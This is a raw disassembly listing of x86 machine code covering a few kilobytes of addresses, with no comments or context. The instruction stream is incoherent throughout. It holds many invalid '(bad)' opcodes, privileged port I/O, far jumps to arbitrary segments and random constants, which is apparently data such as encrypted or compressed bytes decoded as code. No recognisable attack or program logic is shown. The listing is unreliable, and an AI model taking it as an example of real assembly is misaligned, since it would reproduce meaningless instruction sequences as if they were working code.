  42584e:	pop    eax
  42584f:	or     al,0x5
  425851:	mov    esi,0x6aef39a
  425856:	push   0xffffff8c
  425858:	sbb    BYTE PTR [ecx+0x31811a21],ch
  42585e:	pop    ds
  42585f:	cmc    
  425860:	fcmovnbe st,st(1)
  425862:	sbb    edi,DWORD PTR [ebx-0x25b2da67]
  425868:	fistp  QWORD PTR [ebx]
  42586a:	push   esi
  42586b:	ins    DWORD PTR es:[edi],dx
  42586c:	and    eax,0xc3ca2319
  425871:	sub    DWORD PTR [edi-0x29],edx
  425874:	cmc    
  425875:	cwde   
  425876:	icebp  
  425877:	call   0x6d63de41
  42587c:	aam    0x9
  42587e:	jns    0x4258aa
  425880:	mov    ds:0x279c8b9d,al
  425885:	(bad)  
  425886:	jge    0x425899
  425888:	(bad)  
  425889:	mov    ebp,0xa0b62557
  42588e:	jp     0x42589d
  425890:	push   ss
  425891:	or     DWORD PTR [esi],ecx
  425893:	push   esi
  425894:	repnz xor al,0xe7
  425897:	sahf   
  425898:	and    DWORD PTR [esi-0x63],0xe7a95caa
  42589f:	adc    bl,BYTE PTR [ecx]
  4258a1:	or     al,0x63
  4258a3:	mov    ebx,0xcc0c8523
  4258a8:	push   ds
  4258a9:	sub    edx,ecx
  4258ab:	push   ebp
  4258ac:	inc    ebp
  4258ad:	add    cl,cl
  4258af:	xlat   BYTE PTR ds:[ebx]
  4258b0:	pop    edx
  4258b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258b2:	cmp    ebp,DWORD PTR [edi+0x78]
  4258b5:	scas   eax,DWORD PTR es:[edi]
  4258b6:	pop    edx
  4258b7:	pusha  
  4258b8:	xchg   edi,eax
  4258b9:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4258bb:	outs   dx,DWORD PTR ds:[esi]
  4258bc:	or     DWORD PTR fs:[esi-0x6dd03c3c],esi
  4258c3:	rol    DWORD PTR ds:0x5ff49a8d,1
  4258c9:	cmp    al,bh
  4258cb:	push   edx
  4258cc:	cld    
  4258cd:	jp     0x425852
  4258cf:	fstp   DWORD PTR [esi]
  4258d1:	xchg   ebp,eax
  4258d2:	inc    ebx
  4258d3:	and    al,BYTE PTR [ebx-0x27]
  4258d6:	repz push edi
  4258d8:	cdq    
  4258d9:	inc    ebp
  4258da:	outs   dx,BYTE PTR ds:[esi]
  4258db:	xchg   ebx,eax
  4258dc:	or     BYTE PTR [edi-0x2ae98a62],cl
  4258e2:	lods   eax,DWORD PTR ds:[esi]
  4258e3:	and    al,0x20
  4258e5:	loope  0x4258b9
  4258e7:	imul   ecx,DWORD PTR [esi+0x78017ee9],0x260085f7
  4258f1:	add    BYTE PTR [edi+0x15fa959e],bh
  4258f7:	out    0x6a,al
  4258f9:	and    eax,0x6ce1792b
  4258fe:	mov    ds:0x57a4dd5d,al
  425903:	jmp    0x4258fb
  425905:	ins    BYTE PTR es:[edi],dx
  425906:	inc    ebx
  425907:	pop    ds
  425908:	in     eax,0x44
  42590a:	cmp    ebp,esi
  42590c:	jne    0x425934
  42590e:	mov    DWORD PTR [ecx],esp
  425910:	sbb    bh,BYTE PTR [ecx-0x33]
  425913:	pop    edi
  425914:	xlat   BYTE PTR ds:[ebx]
  425915:	jge    0x425941
  425917:	push   0xffffffd2
  425919:	sahf   
  42591a:	or     ecx,DWORD PTR [edx+0x6f]
  42591d:	xchg   ebp,eax
  42591e:	mov    ?,WORD PTR [ebx]
  425920:	rcl    DWORD PTR [edi],1
  425922:	mov    esi,0xbe3b0f33
  425927:	xchg   esp,eax
  425928:	xchg   esi,eax
  425929:	or     ah,BYTE PTR ds:0xfd70a3c1
  42592f:	jmp    0x4258da
  425931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425932:	imul   ebx,DWORD PTR [esi+ebp*4-0x2b],0x45
  425937:	frstor [eax]
  425939:	or     DWORD PTR [esi+0x2f],edx
  42593c:	adc    eax,0x950e4108
  425941:	popf   
  425942:	(bad)  [esi-0x59]
  425946:	and    DWORD PTR [edi-0x23],esi
  425949:	fstp   st(6)
  42594b:	(bad)  
  42594c:	shl    DWORD PTR [edx],1
  42594e:	mov    esp,0xe3731b14
  425953:	int3   
  425954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425955:	sahf   
  425956:	sbb    BYTE PTR [edx-0x3d],0x99
  42595a:	pop    esi
  42595b:	into   
  42595c:	je     0x42598b
  42595e:	xchg   esi,eax
  42595f:	and    eax,0xc4774029
  425964:	cmp    DWORD PTR [edx-0x4606f43b],edi
  42596a:	or     bl,BYTE PTR [eax-0xb765667]
  425970:	push   0x53323ba5
  425975:	lahf   
  425976:	lods   eax,DWORD PTR ds:[esi]
  425977:	or     esp,DWORD PTR ds:0x256a0bc0
  42597d:	mov    ecx,0xf13e2c7c
  425982:	jmp    0x4259ad
  425984:	push   ebp
  425985:	mov    ds:0xb200780b,eax
  42598a:	sub    al,0x34
  42598c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42598d:	sar    DWORD PTR [esi],1
  42598f:	and    BYTE PTR [edi],al
  425991:	lea    edi,[edx-0x75fc225e]
  425997:	in     eax,dx
  425998:	addr16 out dx,al
  42599a:	xchg   esp,eax
  42599b:	fldenv ds:0xbdf3798c
  4259a1:	lea    esi,[ebp-0x70]
  4259a4:	sbb    eax,0x5b24ccc9
  4259a9:	xlat   BYTE PTR ds:[ebx]
  4259aa:	jno    0x425a1e
  4259ac:	loopne 0x42594a
  4259ae:	retf   
  4259af:	aas    
  4259b0:	repnz or eax,0xfaece452
  4259b6:	and    ecx,ebp
  4259b8:	adc    dh,BYTE PTR [edx+0x247834b2]
  4259be:	xchg   ebx,eax
  4259bf:	(bad)  
  4259c0:	jne    0x4259b8
  4259c2:	inc    eax
  4259c3:	out    0x68,eax
  4259c5:	jecxz  0x425981
  4259c7:	(bad)  
  4259c8:	sub    ebx,DWORD PTR [ecx+0x7701d081]
  4259ce:	dec    esi
  4259cf:	(bad)  
  4259d0:	and    esp,DWORD PTR [edi]
  4259d2:	scas   eax,DWORD PTR es:[edi]
  4259d3:	xor    al,0x85
  4259d5:	fnsave [eax]
  4259d7:	out    dx,eax
  4259d8:	(bad)  
  4259d9:	adc    al,0x1c
  4259db:	iret   
  4259dc:	push   ds
  4259dd:	sbb    eax,esp
  4259df:	call   0x6d166c62
  4259e4:	std    
  4259e5:	fistp  QWORD PTR [ebx+0x8]
  4259e8:	into   
  4259e9:	adc    BYTE PTR [ecx],bh
  4259eb:	lds    ecx,FWORD PTR [edi-0x5e]
  4259ee:	sbb    dh,ah
  4259f0:	int3   
  4259f1:	cli    
  4259f2:	mov    ebx,0x65913144
  4259f7:	ret    0xcc5
  4259fa:	xor    eax,0x7a5678e8
  4259ff:	test   al,0x23
  425a01:	stc    
  425a02:	xchg   BYTE PTR [edx],dh
  425a04:	into   
  425a05:	les    ebp,FWORD PTR [edx+ebx*4-0x3ef464d6]
  425a0c:	mov    esp,0x9d70ef29
  425a11:	push   ebp
  425a12:	cmp    al,0xcd
  425a14:	inc    ecx
  425a15:	movsx  esi,sp
  425a18:	sub    al,0xc0
  425a1a:	mov    ecx,0x529f859f
  425a1f:	in     al,dx
  425a20:	and    ebp,DWORD PTR [esp+ebx*8-0x30]
  425a24:	sbb    BYTE PTR [ecx],bh
  425a26:	pop    ecx
  425a27:	jbe    0x4259e5
  425a29:	icebp  
  425a2a:	push   esp
  425a2b:	lds    esp,FWORD PTR [edi+0x7fd3fb9f]
  425a31:	jle    0x425a6f
  425a33:	push   0xffffff95
  425a35:	jg     0x4259cc
  425a37:	mov    ecx,0x64ba223d
  425a3c:	in     al,dx
  425a3d:	and    DWORD PTR [edx+esi*8+0x36],esi
  425a41:	mov    bh,0x42
  425a43:	and    ch,BYTE PTR [edi-0x71acb9dc]
  425a49:	push   esp
  425a4a:	xor    BYTE PTR [edx-0x2b4579ac],dl
  425a50:	sub    al,0xb7
  425a52:	mov    edx,0x21147927
  425a57:	lea    esi,[ebx-0x24]
  425a5a:	mov    bl,0xbc
  425a5c:	inc    esi
  425a5d:	xchg   ebp,eax
  425a5e:	mov    bl,0x93
  425a60:	pop    ss
  425a61:	pop    esi
  425a62:	mov    esp,0xa6649374
  425a67:	sahf   
  425a68:	mov    al,gs:0xd6e9e7a7
  425a6e:	or     DWORD PTR [esi],0xabe499f9
  425a74:	fwait
  425a75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a76:	jg     0x425a45
  425a78:	and    BYTE PTR [edx-0x3e],0x4a
  425a7c:	mov    ch,0x9c
  425a7e:	leave  
  425a7f:	call   0xd4b933ab
  425a84:	and    al,0x19
  425a86:	jo     0x425a6d
  425a88:	cwde   
  425a89:	xlat   BYTE PTR ds:[ebx]
  425a8a:	jnp    0x425af8
  425a8c:	or     al,0x4b
  425a8e:	pop    esp
  425a8f:	add    dl,0xc9
  425a92:	cli    
  425a93:	(bad)  
  425a94:	retf   
  425a95:	jo     0x425a47
  425a97:	ins    BYTE PTR es:[edi],dx
  425a98:	sub    bl,0x54
  425a9b:	ja     0x425b09
  425a9d:	sbb    ebx,DWORD PTR [ebx+0xd46b65a]
  425aa3:	sar    edx,1
  425aa5:	sahf   
  425aa6:	inc    edi
  425aa7:	in     eax,0xbe
  425aa9:	mov    ecx,0xa923b532
  425aae:	adc    BYTE PTR [edi],bh
  425ab0:	sahf   
  425ab1:	repnz push ebx
  425ab3:	and    DWORD PTR [edi],ebp
  425ab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ab6:	dec    ebx
  425ab7:	cwde   
  425ab8:	rol    BYTE PTR [edi+0x45],0xb2
  425abc:	iret   
  425abd:	jmp    DWORD PTR [eax]
  425abf:	sub    dh,al
  425ac1:	sar    BYTE PTR [edx-0x151fd2ac],cl
  425ac7:	pop    ss
  425ac8:	xor    eax,0xf9e90878
  425acd:	int    0x5d
  425acf:	hlt    
  425ad0:	cld    
  425ad1:	jns    0x425b09
  425ad3:	outs   dx,BYTE PTR ds:[esi]
  425ad4:	enter  0xbf9f,0x31
  425ad8:	test   DWORD PTR [ebp+0x31554522],edi
  425ade:	ja     0x425ac6
  425ae0:	mov    cl,0x2c
  425ae2:	call   0xbfbad3f8
  425ae7:	addr16 xor eax,0x1495a1c6
  425aed:	mov    ds:0xb8590ba4,al
  425af2:	inc    ecx
  425af3:	out    0x95,eax
  425af5:	dec    ebp
  425af6:	stc    
  425af7:	in     eax,dx
  425af8:	push   ebp
  425af9:	dec    ebp
  425afa:	inc    edi
  425afb:	dec    eax
  425afc:	sub    ecx,ecx
  425afe:	mov    DWORD PTR [edi],esi
  425b00:	int3   
  425b01:	call   0xaa81:0x57213c0f
  425b08:	push   ebp
  425b09:	sbb    bh,BYTE PTR [eax-0x3a0a0a16]
  425b0f:	pop    edi
  425b10:	push   ss
  425b11:	cmp    DWORD PTR ds:0x6c8f410,edi
  425b17:	pop    eax
  425b18:	pusha  
  425b19:	test   al,0x1b
  425b1b:	mov    edi,0x2f6ed11c
  425b20:	jae    0x2661e5d4
  425b26:	mov    ebp,0x42c3b614
  425b2b:	fwait
  425b2c:	hlt    
  425b2d:	mov    ch,0xfb
  425b2f:	dec    edi
  425b30:	push   ebx
  425b31:	mov    al,0xc4
  425b33:	into   
  425b34:	and    esp,DWORD PTR [ebx-0x5f9bfbf]
  425b3a:	mov    edi,0x89a2b134
  425b3f:	push   edx
  425b40:	(bad)  
  425b41:	nop
  425b42:	jno    0x425b2d
  425b44:	jne    0x425b77
  425b46:	push   ds
  425b47:	out    dx,eax
  425b48:	xor    bh,BYTE PTR [eax+esi*2-0x32]
  425b4c:	call   0xbcbd:0x675e03b2
  425b53:	in     al,0x52
  425b55:	es ss mov ch,0x4f
  425b59:	xor    eax,0xbf85f3ed
  425b5e:	repz in al,dx
  425b60:	in     al,0xbe
  425b62:	les    ecx,FWORD PTR [edi]
  425b64:	sbb    eax,0x877a3589
  425b69:	pop    ss
  425b6a:	cmp    DWORD PTR [ebx+0x2],eax
  425b6d:	cld    
  425b6e:	outs   dx,BYTE PTR ds:[esi]
  425b6f:	xchg   DWORD PTR [ebx+edi*8-0x40],edi
  425b73:	mov    ds:0x94b243ef,eax
  425b78:	out    0x6a,al
  425b7a:	call   0xb577e15f
  425b7f:	lock and edi,DWORD PTR [eax]
  425b82:	xchg   DWORD PTR [esp+0x20a28db9],eax
  425b89:	xchg   BYTE PTR ds:0xf710cc4,al
  425b8f:	js     0x425bb5
  425b91:	rol    ebx,1
  425b93:	xor    edi,DWORD PTR [eax+0x24224b70]
  425b99:	jns    0x425b96
  425b9b:	mov    ebx,DWORD PTR [ebx]
  425b9d:	daa    
  425b9e:	push   ebp
  425b9f:	aas    
  425ba0:	or     al,0xa6
  425ba2:	mov    ebx,0x8e2ad418
  425ba7:	iret   
  425ba8:	outs   dx,BYTE PTR ds:[esi]
  425ba9:	ss inc esi
  425bab:	cmp    al,0x21
  425bad:	xchg   esp,eax
  425bae:	aas    
  425baf:	jae    0x425b93
  425bb1:	cmp    esi,DWORD PTR [ebp+ebx*2+0x1217f923]
  425bb8:	mov    fs,edi
  425bba:	mov    ch,0x82
  425bbc:	xlat   BYTE PTR fs:[ebx]
  425bbe:	and    al,0x7d
  425bc0:	inc    ebp
  425bc1:	outs   dx,BYTE PTR ds:[esi]
  425bc2:	aaa    
  425bc3:	jmp    0x425c15
  425bc5:	dec    ecx
  425bc6:	bnd jno 0x425c02
  425bc9:	or     BYTE PTR [esi],cl
  425bcb:	mov    edx,0xb4ba71e3
  425bd0:	push   ebx
  425bd1:	pop    ds
  425bd2:	ds ds pop ecx
  425bd5:	jle    0x425b85
  425bd7:	push   0x1c
  425bd9:	in     eax,0xec
  425bdb:	in     al,0x9d
  425bdd:	and    eax,0x192106db
  425be2:	ret    
  425be3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425be4:	fucomi st,st(3)
  425be6:	inc    ebx
  425be7:	test   eax,0xed9ba81a
  425bec:	adc    bl,ch
  425bee:	in     eax,dx
  425bef:	jno    0x425b80
  425bf1:	cmc    
  425bf2:	pop    ds
  425bf3:	leave  
  425bf4:	dec    eax
  425bf5:	stc    
  425bf6:	pop    ss
  425bf7:	repz lock sbb edx,esi
  425bfb:	adc    dl,al
  425bfd:	fwait
  425bfe:	push   ecx
  425bff:	jo     0x425bf8
  425c01:	push   0x5696d6f4
  425c06:	pop    ss
  425c07:	push   ds
  425c08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c09:	and    DWORD PTR [ecx],0x90d9245e
  425c0f:	stos   DWORD PTR es:[edi],eax
  425c10:	jb     0x425bf2
  425c12:	rcr    DWORD PTR [edi+0xc],1
  425c15:	mov    eax,ds:0xe2503f1b
  425c1a:	sbb    al,cl
  425c1c:	pminsw mm7,mm2
  425c1f:	fwait
  425c20:	xor    eax,0xea989409
  425c25:	jne    0x425c5c
  425c27:	sbb    ebp,DWORD PTR [edx]
  425c29:	shl    DWORD PTR [ebx+0x6cc43573],0xf3
  425c30:	push   edx
  425c31:	sbb    al,bh
  425c33:	and    ax,0x17a9
  425c37:	dec    eax
  425c38:	xlat   BYTE PTR ds:[ebx]
  425c39:	out    dx,al
  425c3a:	xchg   ebx,eax
  425c3b:	bound  ecx,QWORD PTR [esi-0x63]
  425c3e:	sti    
  425c3f:	xchg   ebp,eax
  425c40:	or     al,BYTE PTR ds:0x43a44c04
  425c46:	scas   eax,DWORD PTR es:[edi]
  425c47:	pop    es
  425c48:	mov    bl,0x87
  425c4a:	mov    cl,0x34
  425c4c:	ret    
  425c4d:	inc    edx
  425c4e:	push   ebx
  425c4f:	ja     0x425bd6
  425c51:	shl    DWORD PTR [edx+esi*8+0x24000a7a],1
  425c58:	inc    eax
  425c59:	test   eax,0x35bd2938
  425c5e:	test   BYTE PTR [ebx+ecx*4],0x24
  425c62:	mov    esi,0x935c96ef
  425c67:	arpl   WORD PTR [ebp-0x5a],ax
  425c6a:	ins    DWORD PTR es:[edi],dx
  425c6b:	jne    0x425cc9
  425c6d:	mov    esp,0xea25a9c9
  425c72:	mov    ebx,0x82e1bf04
  425c77:	in     eax,dx
  425c78:	push   ebp
  425c79:	pop    edi
  425c7a:	pop    ds
  425c7b:	repnz out 0x7b,eax
  425c7e:	jge    0x425cd4
  425c80:	sbb    eax,0x166fdda9
  425c85:	sbb    eax,0x9b49f808
  425c8a:	pop    ebx
  425c8b:	sti    
  425c8c:	int    0x1e
  425c8e:	mov    dl,0xae
  425c90:	outs   dx,BYTE PTR ds:[esi]
  425c91:	push   eax
  425c92:	and    bl,bh
  425c94:	icebp  
  425c95:	or     al,0xbf
  425c97:	mov    ah,0x37
  425c99:	jnp    0x425c72
  425c9b:	popa   
  425c9c:	mov    ch,0xc0
  425c9e:	outs   dx,BYTE PTR ds:[esi]
  425c9f:	in     eax,dx
  425ca0:	add    edx,ecx
  425ca2:	test   BYTE PTR [esi+0x1],dl
  425ca5:	sti    
  425ca6:	retf   
  425ca7:	add    DWORD PTR [ecx+edx*8],esp
  425caa:	jns    0x425c2f
  425cac:	push   0x6e
  425cae:	aam    0x3b
  425cb0:	push   ebp
  425cb1:	fisttp DWORD PTR [edx-0x16]
  425cb4:	dec    eax
  425cb5:	(bad)  
  425cb6:	mov    esi,DWORD PTR ds:0xd086e9fc
  425cbc:	in     eax,dx
  425cbd:	mov    ds:0x84106c5d,al
  425cc2:	mov    ds:0xa30fb439,eax
  425cc7:	in     eax,dx
  425cc8:	psrad  mm7,QWORD PTR [esi]
  425ccb:	hlt    
  425ccc:	lds    eax,FWORD PTR [edx-0x32701a55]
  425cd2:	xchg   dx,ax
  425cd4:	sbb    DWORD PTR [ecx],ecx
  425cd6:	and    al,0xd1
  425cd8:	cmp    DWORD PTR [ebp-0x31],ebp
  425cdb:	addr16 ret 0x8bd4
  425cdf:	gs hlt 
  425ce1:	or     eax,0x721cbf1f
  425ce6:	(bad)  
  425ce7:	and    eax,0x9b0092c
  425cec:	and    eax,0x57bfb325
  425cf1:	pop    es
  425cf2:	jge    0x425d4d
  425cf4:	test   DWORD PTR [edx+edx*2],esi
  425cf7:	out    0x67,eax
  425cf9:	sbb    esp,DWORD PTR [ebp-0x46]
  425cfc:	sbb    DWORD PTR [ecx-0x41],edi
  425cff:	or     eax,0x6fca58b8
  425d04:	es pop ds
  425d06:	adc    esp,ecx
  425d08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d09:	retf   
  425d0a:	js     0x425cf3
  425d0c:	mov    edi,0x25decee6
  425d11:	pop    ecx
  425d12:	clc    
  425d13:	sub    ebp,DWORD PTR [esi+eiz*1]
  425d16:	les    edi,FWORD PTR [ecx+0x29]
  425d19:	sub    ebx,esp
  425d1b:	adc    eax,0x2aea94aa
  425d20:	js     0x425d2b
  425d22:	mov    ebx,0x9529fa8c
  425d27:	imul   edi,DWORD PTR [ebx],0xffffffb8
  425d2a:	pop    edi
  425d2b:	jmp    0x425d91
  425d2d:	sub    esp,eax
  425d2f:	lock mov ah,0xa8
  425d32:	cmp    eax,DWORD PTR [ecx-0x43b9c19e]
  425d38:	fwait
  425d39:	test   BYTE PTR [eax+0x71],dh
  425d3c:	out    dx,al
  425d3d:	jmp    0xd1c1:0x151c735a
  425d44:	pop    ebx
  425d45:	cmp    dl,BYTE PTR [edx+ecx*8]
  425d48:	cmp    eax,0x2f508b9c
  425d4d:	push   cs
  425d4e:	iret   
  425d4f:	pop    edi
  425d50:	inc    esi
  425d51:	(bad)  
  425d52:	cmp    eax,DWORD PTR [ebp+0x54b9e23c]
  425d58:	jmp    0x2043:0xd7ebe3a3
  425d5f:	rcr    ebp,1
  425d61:	push   edx
  425d62:	add    BYTE PTR [edi+0x5c66433a],cl
  425d68:	out    0x4e,eax
  425d6a:	popa   
  425d6b:	icebp  
  425d6c:	sbb    eax,0xe8c339b9
  425d71:	and    eax,0xf35b7c25
  425d76:	jnp    0x425dc2
  425d78:	or     BYTE PTR [ebp+0x23c554cd],cl
  425d7e:	mov    ebp,fs
  425d80:	popf   
  425d81:	and    ebx,DWORD PTR [ebx-0x40e0413c]
  425d87:	xor    al,0x58
  425d89:	outs   dx,BYTE PTR ds:[esi]
  425d8a:	loop   0x425d13
  425d8c:	xchg   ebp,eax
  425d8d:	(bad)  
  425d8e:	or     ch,dh
  425d90:	sub    al,0x15
  425d92:	(bad)  
  425d93:	push   edx
  425d94:	push   esi
  425d95:	push   eax
  425d96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d97:	adc    al,0xf7
  425d99:	mov    ebx,0x126d74b9
  425d9e:	out    dx,al
  425d9f:	xlat   BYTE PTR ds:[ebx]
  425da0:	ss ins BYTE PTR es:[edi],dx
  425da2:	outs   dx,BYTE PTR ds:[esi]
  425da3:	sbb    eax,DWORD PTR [edx-0x55]
  425da6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425da7:	inc    esi
  425da8:	test   al,0x5e
  425daa:	cmp    eax,DWORD PTR [ecx-0x6b4d78b1]
  425db0:	add    al,0xd4
  425db2:	ins    BYTE PTR es:[edi],dx
  425db3:	jge    0x425dbc
  425db5:	sub    bh,BYTE PTR [ecx]
  425db7:	ret    
  425db8:	sar    DWORD PTR [eax-0x1904158e],0xbb
  425dbf:	lea    edi,[ebx+0x32]
  425dc2:	mov    ah,0x64
  425dc4:	dec    edx
  425dc5:	rol    BYTE PTR [ebx+0x5f],1
  425dc8:	test   DWORD PTR [ebx-0x21bd1691],esi
  425dce:	ins    BYTE PTR es:[edi],dx
  425dcf:	pop    ds
  425dd0:	push   edi
  425dd1:	adc    BYTE PTR [edi],ah
  425dd3:	repnz inc edi
  425dd5:	and    bh,BYTE PTR [eax-0x7f9f53c]
  425ddb:	or     BYTE PTR [esi-0xefc91b4],dl
  425de1:	mov    esi,fs
  425de3:	in     eax,0x61
  425de5:	push   ecx
  425de6:	loopne 0x425dda
  425de8:	xchg   esp,eax
  425de9:	std    
  425dea:	mov    al,0x4
  425dec:	mov    edi,0xc199b
  425df1:	mov    ds:0xdd3cf14b,al
  425df6:	or     BYTE PTR [esi],bl
  425df8:	jbe    0x425e51
  425dfa:	cmp    bh,al
  425dfc:	(bad)  
  425dfd:	scas   al,BYTE PTR es:[edi]
  425dfe:	jmp    0x1f9c:0x94a43a64
  425e05:	fsubr  DWORD PTR [ebx+0x286567e7]
  425e0b:	fwait
  425e0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e0d:	aad    0x7f
  425e0f:	lea    ebx,[ebx]
  425e11:	mov    ecx,0x29a8ca55
  425e16:	push   ebx
  425e17:	adc    BYTE PTR [edx-0x49],0xc2
  425e1b:	into   
  425e1c:	(bad)  [eax+0xbe13e2b]
  425e22:	daa    
  425e23:	leave  
  425e24:	hlt    
  425e25:	sbb    eax,0x3643a913
  425e2a:	jecxz  0x425dc0
  425e2c:	(bad)  
  425e2d:	popf   
  425e2e:	aaa    
  425e2f:	popf   
  425e30:	ret    0x3bb3
  425e33:	adc    al,0xcb
  425e35:	and    dl,BYTE PTR [ebp-0x7e11337]
  425e3b:	adc    BYTE PTR [esi],0x19
  425e3e:	xor    edx,DWORD PTR [eax+0xad224bf]
  425e44:	push   edx
  425e45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e46:	jmp    0x425e9c
  425e48:	and    eax,0x565573e1
  425e4d:	leave  
  425e4e:	lds    edi,FWORD PTR [ebx-0x1b4439f5]
  425e54:	fnstcw WORD PTR [esi-0x1fc9f1b6]
  425e5a:	adc    al,0x1d
  425e5c:	loopne 0x425e9a
  425e5e:	das    
  425e5f:	jno    0x425e46
  425e61:	add    al,0x38
  425e63:	pusha  
  425e64:	jge    0x425e10
  425e66:	mov    dh,0x73
  425e68:	and    al,0xf9
  425e6a:	ss cmp eax,0xd7825be2
  425e70:	push   ebp
  425e71:	jo     0x425e56
  425e73:	jmp    0x425ec9
  425e75:	jae    0x425e6f
  425e77:	push   ds
  425e78:	add    al,0x18
  425e7a:	cmp    DWORD PTR [edx+0x34e08575],eax
  425e80:	scas   eax,DWORD PTR es:[edi]
  425e81:	and    al,0xeb
  425e83:	shr    BYTE PTR [esi+eiz*4],0x7b
  425e87:	retf   
  425e88:	clc    
  425e89:	stc    
  425e8a:	pop    DWORD PTR ds:0x61129354
  425e90:	stc    
  425e91:	pop    es
  425e92:	lods   eax,DWORD PTR ds:[esi]
  425e93:	jne    0x425e7c
  425e95:	fstp   st(7)
  425e97:	mul    DWORD PTR [eiz*1+0x44f5b1c2]
  425e9e:	add    bh,ah
  425ea0:	inc    esp
  425ea1:	cs jo  0x425e96
  425ea4:	test   ebp,edx
  425ea6:	and    DWORD PTR [edi+0x74],0x5d468a1a
  425ead:	jle    0x425e97
  425eaf:	inc    esp
  425eb0:	outs   dx,BYTE PTR ds:[esi]
  425eb1:	aaa    
  425eb2:	pop    ds
  425eb3:	in     eax,0xb5
  425eb5:	int3   
  425eb6:	xchg   ah,dh
  425eb8:	jnp    0x425eb4
  425eba:	lock jp 0x425e4a
  425ebd:	mov    edx,0xa3c63c48
  425ec2:	retf   
  425ec3:	(bad)  
  425ec4:	pop    edi
  425ec5:	mov    ds:0x99ffe137,al
  425eca:	and    eax,0x3013c91c
  425ecf:	fimul  DWORD PTR [edx-0x6443f1df]
  425ed5:	jo     0x425e90
  425ed7:	pop    ss
  425ed8:	xchg   ebp,eax
  425ed9:	dec    edx
  425eda:	mov    esi,ecx
  425edc:	mov    eax,0x21a82c3b
  425ee1:	test   eax,0xc61841de
  425ee6:	jp     0x425edb
  425ee8:	repnz mov ecx,0x87763bb
  425eee:	xchg   esp,eax
  425eef:	push   ds
  425ef0:	pop    ss
  425ef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ef2:	inc    edx
  425ef3:	xchg   BYTE PTR [ecx+ebp*8],bl
  425ef6:	jmp    0x3180:0x638c99eb
  425efd:	xlat   BYTE PTR ds:[ebx]
  425efe:	jnp    0x425ef3
  425f00:	mov    al,0xdd
  425f02:	mov    ebx,0x3fe8a7da
  425f07:	nop
  425f08:	and    dl,dh
  425f0a:	adc    BYTE PTR [edi+0x1d],dl
  425f0d:	(bad)  
  425f0e:	in     al,0x28
  425f10:	sbb    ecx,ebp
  425f12:	lahf   
  425f13:	shl    DWORD PTR [ecx+0x6157cf2],1
  425f19:	mov    eax,ds:0x4958f69b
  425f1e:	es pushf 
  425f20:	xor    bh,BYTE PTR [ebx]
  425f22:	and    BYTE PTR [edi+0x34b088d3],bh
  425f28:	mov    al,0x4c
  425f2a:	jno    0x425f99
  425f2c:	xchg   ebp,eax
  425f2d:	inc    edi
  425f2e:	cmp    al,0xe6
  425f30:	inc    esi
  425f31:	jge    0x425f47
  425f33:	and    eax,0x14897920
  425f38:	pop    ss
  425f39:	loopne 0x425f3e
  425f3b:	adc    bl,dh
  425f3d:	or     al,0xfd
  425f3f:	cwde   
  425f40:	cmp    eax,0xcd2eaba9
  425f45:	scas   eax,DWORD PTR es:[edi]
  425f46:	xor    eax,0x8876c552
  425f4b:	imul   edi,DWORD PTR [esi],0x6d854644
  425f51:	jge    0x425fa6
  425f53:	jmp    0xd7a9:0x2b0ba0f1
  425f5a:	sub    ecx,DWORD PTR [edi]
  425f5c:	das    
  425f5d:	mov    bl,0x1b
  425f5f:	cmp    al,0xee
  425f61:	jmp    0xc28f41d
  425f66:	or     al,0xe8
  425f68:	xchg   esi,eax
  425f69:	out    0xf8,eax
  425f6b:	sbb    DWORD PTR [edi],0xffffff91
  425f6e:	mov    DWORD PTR [ebx-0x1257556c],edi
  425f74:	xor    eax,0x4fa4bc32
  425f79:	dec    ebx
  425f7a:	mov    al,0x7d
  425f7c:	mov    ch,0xed
  425f7e:	jg     0x425f6c
  425f80:	push   cs
  425f81:	fidivr WORD PTR [ebx]
  425f83:	inc    esi
  425f84:	sbb    BYTE PTR [ecx],ch
  425f86:	mov    ecx,0xb7fb34f1
  425f8b:	mov    edx,0xa0bb9f30
  425f90:	(bad)  
  425f91:	sbb    ebp,DWORD PTR [ecx+0x21]
  425f94:	test   DWORD PTR [ebp+0x18],ebp
  425f97:	js     0x425fb7
  425f99:	leave  
  425f9a:	sbb    eax,0x4035f7c
  425f9f:	pop    es
  425fa0:	fisubr WORD PTR [ebx+0x4f]
  425fa3:	or     bl,BYTE PTR [eax]
  425fa5:	cmp    eax,edx
  425fa7:	out    dx,al
  425fa8:	bound  edx,QWORD PTR [esi]
  425faa:	pop    ebp
  425fab:	push   ss
  425fac:	and    al,0xa9
  425fae:	sub    eax,DWORD PTR [ecx+edx*8+0x71]
  425fb2:	jne    0x425fb8
  425fb4:	jl     0x425f4f
  425fb6:	pop    esi
  425fb7:	mov    ch,0xda
  425fb9:	add    al,0x6f
  425fbb:	or     ah,BYTE PTR [eax]
  425fbd:	stc    
  425fbe:	test   eax,0x9710fd09
  425fc3:	or     eax,0xd0bb9aff
  425fc8:	repnz mov cl,0x35
  425fcb:	jmp    0x1df8:0x1726f38b
  425fd2:	mov    DWORD PTR [eax+ebp*1+0x7a],0x9b382c9a
  425fda:	mov    ebx,0x8ae35e2a
  425fdf:	jle    0x425ff2
  425fe1:	icebp  
  425fe2:	add    al,cl
  425fe4:	in     eax,0x6b
  425fe6:	mov    ecx,0x28416ea4
  425feb:	ret    0x3908
  425fee:	aas    
  425fef:	push   edx
  425ff0:	jne    0x425feb
  425ff2:	scas   al,BYTE PTR es:[edi]
  425ff3:	repnz add DWORD PTR [eax+0x4fb12207],eax
  425ffa:	mov    edi,0x4b1836e4
  425fff:	pop    edi
  426000:	xchg   ebp,eax
  426001:	call   0x63be4551
  426006:	and    ah,dh
